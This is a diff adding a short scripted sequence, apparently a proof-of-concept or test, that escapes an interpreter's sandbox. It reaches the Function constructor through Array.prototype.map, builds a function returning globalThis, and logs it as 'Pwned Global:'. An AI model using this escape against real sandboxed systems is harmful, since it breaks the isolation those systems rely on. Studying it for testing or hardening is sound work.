@@ -1,0 +1,6 @@
+- [SET, [arr, []]]
+- [EXEC, [Reflect.get, [$arr, map]]]
+- [EXEC, [Reflect.get, [$LAST, constructor]]]
+- [EXEC, [Reflect.apply, [$LAST, null, ["return globalThis"]]]]
+- [EXEC, [Reflect.apply, [$LAST, null, []]]]
+- [EXEC, [console.log, ["Pwned Global:", $LAST]]]
